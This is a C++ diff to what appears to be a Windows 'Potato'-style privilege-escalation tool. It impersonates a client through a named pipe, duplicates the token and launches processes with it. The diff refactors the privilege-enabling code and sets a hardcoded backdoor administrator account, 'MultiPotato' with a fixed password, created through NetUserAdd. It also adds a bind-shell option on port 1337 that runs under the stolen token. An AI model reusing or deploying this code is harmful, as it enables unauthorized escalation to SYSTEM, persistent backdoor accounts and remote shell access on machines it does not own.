@@ -13,6 +13,14 @@
 #include "common.h"
 #include <chrono>
 #include <thread>
+#ifdef UNICODE
+#define UNICODE
+#endif
+#include<windows.h>
+#include<Shlobj.h>
+#include<lmaccess.h> 
+#include<iostream>
+#include "Bind.h"
 
 extern wchar_t* commandline;
 extern wchar_t* arguments;
@@ -20,38 +28,42 @@ extern wchar_t* pipe_placeholder;
 char gPipeName[MAX_PATH];
 
 
-#ifdef UNICODE
-#define UNICODE
-#endif
-#include<windows.h>
-#include<Shlobj.h>
-#include<stdio.h>
-#include<stdlib.h>
-#include<lm.h>
-#include<lmaccess.h> 
-#include<iostream>
-#include<comdef.h>
-
 #pragma comment(lib,"netapi32.lib")
 
-
-int CreateAdminUser()
+void AssignPrivs(HANDLE hToken)
 {
-	LPWSTR username = (LPWSTR)L"rtecAdmin";
-	LPWSTR password = (LPWSTR)L"S3cretP4ssw0rd!";
-	
-	/*
-	std::string str1 = "rtecAdmin";
-	BSTR b = _com_util::ConvertStringToBSTR(str1.c_str());
-	LPWSTR lp1 = b;
-	username = b;
-	SysFreeString(b);
-	*/
+	// Enable SE_ASSIGNPRIMARYToken for the Duplicated Token
+	bool success = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
 
+	if (success)
+	{
+		printf("[+] Assign Primary token Success!!!\n", GetLastError());
+	}
+
+	// Enable SE_INCREASE_QUOTA_NAME for the Duplicated Token
+	success = EnablePriv(hToken, SE_INCREASE_QUOTA_NAME);
+
+	if (success)
+	{
+		printf("[+] Assign Increase Quota Name Success!!!\n", GetLastError());
+	}
+}
+
+void Whoami()
+{
 	TCHAR username2[UNLEN + 1];
 	DWORD size = UNLEN + 1;
 	GetUserName((TCHAR*)username2, &size);
 	printf("[*] Running as user: %S\n", username2);
+}
+
+int CreateAdminUser()
+{
+	LPWSTR username = (LPWSTR)L"MultiPotato";
+	LPWSTR password = (LPWSTR)L"S3cretP4ssw0rd!";
+	
+	
+	Whoami();
 	/*
 	BOOL IsAdmin = IsUserAnAdmin();				// https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-isuseranadmin
 	if (!IsAdmin)
@@ -79,12 +91,11 @@ int CreateAdminUser()
 		nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, NULL);
 		if (nStatus == NERR_Success)
 		{
-			fwprintf(stderr, L"[+] User %s has been successgully added on localhost\n", username);
+			fwprintf(stderr, L"[+] User %s has been successfully added with the password %s on localhost\n", username, password);
 		}
 		else
 		{
 			fwprintf(stderr, L"[-] A system error has occurred: %d\n", nStatus);
-			printf("[*]  A system error has occurred: %d\n", nStatus);
 		}
 	
 
@@ -103,7 +114,6 @@ int CreateAdminUser()
 	else
 	{
 		fwprintf(stderr, L"[-] A system error has occurred: %d\n", gStatus);
-		printf("[-]  A system error has occurred: %d\n", gStatus);
 	}
 
 	return 0;
@@ -131,7 +141,6 @@ DWORD WINAPI PipeServer(LPVOID lpParam)
 
 	//LPWSTR PipeName = (LPWSTR)L"\\\\.\\pipe\\pwnme/pipe/srvsvc";
 	LPWSTR technique = (LPWSTR)lpParam;
-	//LPWSTR PipeName = (LPWSTR)lpParam;
 	
 	
 
@@ -201,26 +210,13 @@ DWORD WINAPI PipeServer(LPVOID lpParam)
 		{
 
 
-			// Enable SE_ASSIGNPRIMARYToken for the Duplicated Token
-			bool success = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
-
-			if (success)
-			{
-				printf("[+] Assign Primary token Success!!!\n", GetLastError());
-			}
-
-			// Enable SE_INCREASE_QUOTA_NAME for the Duplicated Token
-			success = EnablePriv(hToken, SE_INCREASE_QUOTA_NAME);
-
-			if (success)
-			{
-				printf("[+] Assign Increase Quota Name Success!!!\n", GetLastError());
-			}
+			AssignPrivs(hToken);
 
 			printf("[*] Token authentication using CreateProcessAsUserW for launching: %S\n", commandline);
 
 			//RevertToSelf();
 
+			Whoami();
 
 			b1 = CreateProcessAsUserW(
 				hToken,
@@ -290,23 +286,15 @@ DWORD WINAPI PipeServer(LPVOID lpParam)
 		}
 		else if ((lstrcmpW(technique, L"CreateUser") == 0))
 		{
-			// Enable SE_ASSIGNPRIMARYToken for the Duplicated Token
-			bool success = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
-
-			if (success)
-			{
-				printf("[+] Assign Primary token Success!!!\n", GetLastError());
-			}
-
-			// Enable SE_INCREASE_QUOTA_NAME for the Duplicated Token
-			success = EnablePriv(hToken, SE_INCREASE_QUOTA_NAME);
-
-			if (success)
-			{
-				printf("[+] Assign Increase Quota Name Success!!!\n", GetLastError());
-			}
-
+			AssignPrivs(hToken);
 			CreateAdminUser();
+
+		}
+		else if ((lstrcmpW(technique, L"BindShell") == 0))
+		{
+			//AssignPrivs(hToken);
+			BindShell bindShell;
+			bindShell.Run(1337, pToken2);
 
 		}
 		else
